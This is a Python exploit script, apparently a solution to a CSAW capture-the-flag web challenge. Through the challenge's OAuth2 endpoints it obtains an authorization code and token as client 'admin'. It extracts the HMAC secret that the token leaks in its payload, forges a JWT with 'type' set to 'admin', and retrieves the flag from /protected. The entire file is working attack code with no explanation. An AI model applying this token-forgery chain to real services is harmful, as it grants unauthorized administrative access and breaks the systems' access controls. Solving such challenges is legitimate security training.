
import requests
from urllib.parse import parse_qs, urlparse
from base64 import b64decode, urlsafe_b64decode
from hashlib import sha256
import jwt
from time import time
import json
import hmac

BASE_URL = 'http://web.chal.csaw.io:9000'

# POST /oauth2/token
# POST /oauth2/authorize


def get_code():

  form = {
    'response_type': 'code',
    'state': 'foobar',
    'redirect_uri': 'http://example.com',
    'client_id': 'admin',
  }

  response = requests.post(BASE_URL + '/oauth2/authorize', data = form, allow_redirects = False)
  response.raise_for_status()

  code = parse_qs(urlparse(response.headers['Location']).query)['code'][0]

  #print(b64decode(code))

  return code



def get_token(code):
  form = {
    'grant_type': 'authorization_code',
    'code': code,
    'redirect_uri': 'http://example.com',
    'client_id': 'admin'
  }
  response = requests.post(BASE_URL + '/oauth2/token', data = form, allow_redirects = False)
  response.raise_for_status()
  json = response.json()
  token_type = json['token_type']
  token = json['token']
  return token_type, token

def forge_token(token):
  encoded_header, encoded_payload, signature = token.split('.')
  header_text = urlsafe_b64decode(pad(encoded_header)).decode('utf-8')
  payload_text = urlsafe_b64decode(pad(encoded_payload)).decode('utf-8')
  header = json.loads(header_text)
  payload = json.loads(payload_text)
  # If you use the wrong secret /protected returns 500.
  secret = payload['secret']
  payload['type'] = 'admin'
  return jwt.encode(payload, secret, algorithm='HS256').decode('utf-8')

def get_flag(token_type, token):
  headers = {
    'Authorization': token_type + ' ' + token
  }
  response = requests.get('http://web.chal.csaw.io:9000/protected', headers = headers);
  response.raise_for_status()
  return response.text

def pad(x):
  n = len(x)
  r = n % 4
  return x + '=' * (4 - r)

code = get_code()
token_type, token = get_token(code)
token = forge_token(token)
flag = get_flag(token_type, token)
print(flag)

